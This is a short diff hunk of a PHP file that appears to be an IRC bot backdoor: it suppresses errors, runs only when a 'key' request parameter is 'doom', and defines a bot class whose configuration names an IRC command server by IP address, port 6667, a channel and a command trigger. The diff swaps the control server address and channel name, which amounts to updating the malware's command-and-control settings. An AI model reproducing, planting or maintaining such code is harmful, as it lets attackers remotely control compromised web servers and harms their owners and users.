@@ -5,12 +5,12 @@ error_reporting(0);
 if(isset($_GET['key']) == "doom") {
     class sell {
         var $config = array(
-					'server' => '213.153.70.66',
+					'server' => '213.153.68.5',
 					'port' => '6667',
 					"key" => '',
 					'prefix' => 'Linux',
 					'maxrand' => '5',
-					'chan' => '#sandro',
+					'chan' => '#end',
 					'trigger' => '.',
 					'password' => '',
 					'auth' => ''
